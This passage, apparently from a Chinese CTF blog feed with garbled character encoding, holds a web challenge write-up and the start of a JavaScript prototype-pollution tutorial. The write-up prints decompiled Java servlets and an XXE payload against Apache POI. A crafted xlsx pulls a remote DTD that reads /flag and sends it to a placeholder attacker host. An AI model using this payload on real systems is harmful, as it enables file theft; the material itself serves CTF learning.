class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>    fileName = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(fileName.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> ((fileName != <span class="hljs-literal">null</span>) &amp;&amp; (fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>))) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;ç¦æ­¢è¯»å–&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSaveRootPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> (!(file.exists())) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;æ‚¨è¦ä¸‹è½½çš„èµ„æºå·²è¢«åˆ é™¤!&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">realname</span> <span class="hljs-operator">=</span> fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>    response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>      out.write(buffer, <span class="hljs-number">0</span>, len);<br>    in.close();<br>    out.close();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findFileSavePathByFileName</span><span class="hljs-params">(String filename, String saveRootPath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> saveRootPath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UploadServlet.class</code>æºç å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileUploadException;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;<br><span class="hljs-keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Sheet;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Workbook;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>    <span class="hljs-keyword">if</span> (!(tempFile.exists()))<br>      tempFile.mkdir();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-type">DiskFileItemFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItemFactory</span>();<br>      factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>      factory.setRepository(tempFile);<br>      <span class="hljs-type">ServletFileUpload</span> <span class="hljs-variable">upload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletFileUpload</span>(factory);<br><br>      upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>      upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>      upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>      <span class="hljs-keyword">if</span> (!(ServletFileUpload.isMultipartContent(request)))<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> upload.parseRequest(request);<br>      <span class="hljs-type">Iterator</span> <span class="hljs-variable">localIterator</span> <span class="hljs-operator">=</span> list.iterator();<br>      <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; FileItem fileItem;<br>        String filename;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">do</span> &#123; String str;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">if</span> (!(localIterator.hasNext())) <span class="hljs-keyword">break</span> label438; fileItem = (FileItem)localIterator.next();<br>              <span class="hljs-keyword">if</span> (!(fileItem.isFormField())) <span class="hljs-keyword">break</span>;<br>              <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> fileItem.getFieldName();<br>              str = fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            &#125;<br><br>            filename = fileItem.getName(); &#125;<br>          <span class="hljs-keyword">while</span> (filename == <span class="hljs-literal">null</span>); <span class="hljs-keyword">if</span> (!(filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>        <span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">saveFilename</span> <span class="hljs-operator">=</span> makeFileName(filename);<br>        request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>        request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">realSavePath</span> <span class="hljs-operator">=</span> makePath(saveFilename, savePath);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>          out.write(buffer, <span class="hljs-number">0</span>, len);<br>        in.close();<br>        out.close();<br>        label438: message = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ!&quot;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileUploadException e) &#123;<br>      e.printStackTrace();<br>    &#125;<br>    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, message);<br>    request.getRequestDispatcher(<span class="hljs-string">&quot;/ListFileServlet&quot;</span>).forward(request, response); &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makeFileName</span><span class="hljs-params">(String filename)</span> &#123;<br>    <span class="hljs-keyword">return</span> UUID.randomUUID().toString() + <span class="hljs-string">&quot;_&quot;</span> + filename; &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makePath</span><span class="hljs-params">(String filename, String savePath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> savePath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»<code>UploadServlet.class</code>å¯ä»¥å…³æ³¨åˆ°å¦‚ä¸‹å…³é”®ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>Apache POI XMLå¤–éƒ¨å®ä½“æ”»å‡»()</code>ç›¸å…³å¯¹åº”æ¼æ´ç‰ˆæœ¬ä¸º<code>poi-ooxml-3.10-FINAL.jaråŠä»¥ä¸‹ç‰ˆæœ¬</code>ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯é’ˆå¯¹<code>Office</code>çš„æ”»å‡»ï¼Œäºæ˜¯å¯ä»¥è¿›è¡Œå°è¯•ã€‚åˆ›å»ºåä¸º<code>excel-1.xlsx</code>çš„æ–‡ä»¶ï¼Œä¿®æ”¹åç¼€ä¸º<code>zip</code>,ä½¿ç”¨<code>winrar</code>è¿›è¡Œè§£å‹ï¼Œä¿®æ”¹<code>[Content-Types].xml</code>æ–‡ä»¶ï¼Œåœ¨ç¬¬2è¡Œæ·»åŠ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip:8001/file.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°†æ–‡ä»¶é‡æ–°å‹ç¼©ï¼Œå¹¶æ”¹åç¼€ä¸º<code>xlsx</code></p><p>æ¥ç€ä½¿ç”¨<code>python3</code>èµ·ä¸€ä¸ªHTTPæœåŠ¡<code>python -m http.server 8001</code>å¼€å¯HTTPæœåŠ¡ï¼Œå¹¶æ”¾ç½®<code>file.dtd</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:8989?p=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>å¼€å¯ç›‘å¬ï¼Œä¸Šä¼ xlsxæ–‡ä»¶</p><pre><code class="hljs">å¦‚æœä½ æœ‰ä»»ä½•å…¶ä»–éœ€æ±‚æˆ–éœ€è¦è¿›ä¸€æ­¥çš„è§£é‡Šï¼Œè¯·å‘Šè¯‰æˆ‘ã€‚</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>ssrf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsåŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h3 id="JSåŸºç¡€æ•°æ®ç±»å‹ï¼š"><a href="#JSåŸºç¡€æ•°æ®ç±»å‹ï¼š" class="headerlink" title="JSåŸºç¡€æ•°æ®ç±»å‹ï¼š"></a>JSåŸºç¡€æ•°æ®ç±»å‹ï¼š</h3><ol><li><strong>åŸºæœ¬æ•°æ®ç±»å‹</strong>:<ul><li><code>String</code></li><li><code>Number</code></li><li><code>Boolean</code></li><li><code>Null</code></li><li><code>Undefined</code></li><li><code>Symbol</code></li></ul></li><li><strong>å¼•ç”¨ç±»å‹</strong>:<ul><li><code>Object</code></li><li><code>Array</code></li><li><code>Function</code></li></ul></li></ol><h3 id="å˜é‡å®šä¹‰"><a href="#å˜é‡å®šä¹‰" class="headerlink" title="å˜é‡å®šä¹‰:"></a>å˜é‡å®šä¹‰:</h3><ul><li><p><strong>å˜é‡å®šä¹‰çš„ä¾‹å­</strong>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> car = <span class="hljs-string">&#x27;A&#x27;</span>; <span class="hljs-comment">// å®šä¹‰å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">var</span> car = <span class="hljs-string">&#x27;B&#x27;</span>; <span class="hljs-comment">// å¦ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="hljs-keyword">var</span> x = <span class="hljs-number">3.0</span>;   <span class="hljs-comment">// å®šä¹‰æ•°å­—</span><br><span class="hljs-keyword">var</span> is = <span class="hljs-literal">true</span>; <span class="hljs-comment">// å®šä¹‰å¸ƒå°”å€¼</span><br></code></pre></td></tr></table></figure></li><li><p><strong>æ•°ç»„å®šä¹‰</strong>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> cars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>cars[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;A&quot;</span>; <span class="hljs-comment">// ç›´æ¥èµ‹å€¼</span><br><br><span class="hljs-keyword">var</span> cars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>); <span class="hljs-comment">// ä½¿ç”¨Arrayæ„é€ å‡½æ•°å®šä¹‰</span><br><br><span class="hljs-keyword">var</span> cars = [<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>]; <span class="hljs-comment">// ä½¿ç”¨å­—é¢é‡å®šä¹‰æ•°ç»„</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="å¯¹è±¡å®šä¹‰ï¼š"><a href="#å¯¹è±¡å®šä¹‰ï¼š" class="headerlink" title="å¯¹è±¡å®šä¹‰ï¼š"></a>å¯¹è±¡å®šä¹‰ï¼š</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> person = &#123;<span class="hljs-attr">first</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">last</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-attr">score</span>: <span class="hljs-string">&quot;C&quot;</span>&#125;; <span class="hljs-comment">// å®šä¹‰å¯¹è±¡</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡å¯¹è±¡è¿›è¡Œå±æ€§è®¿é—®:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">name = person.<span class="hljs-property">first</span>; <span class="hljs-comment">// è®¿é—®å¯¹è±¡çš„å±æ€§</span><br>name = person[<span class="hljs-string">&quot;first&quot;</span>]; <span class="hljs-comment">// å¦ä¸€ç§æ–¹å¼è®¿é—® (ç±»ä¼¼ Python)</span><br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°å®šä¹‰ï¼š"><a href="#å‡½æ•°å®šä¹‰ï¼š" class="headerlink" title="å‡½æ•°å®šä¹‰ï¼š"></a>å‡½æ•°å®šä¹‰ï¼š</h3><ul><li><p><strong>ä¼ ç»Ÿå‡½æ•°å®šä¹‰</strong>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xx</span>(<span class="hljs-params">a, c</span>) &#123;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>åŒ¿åå‡½æ•°èµ‹å€¼</strong>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> xx = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, c</span>) &#123;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>ç®­å¤´å‡½æ•°</strong>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> <span class="hljs-title function_">xx</span> = (<span class="hljs-params">a, c</span>) =&gt; &#123;&#125;;<br></code></pre></td></tr></table></figure></li></ul><h3 id="åŠ 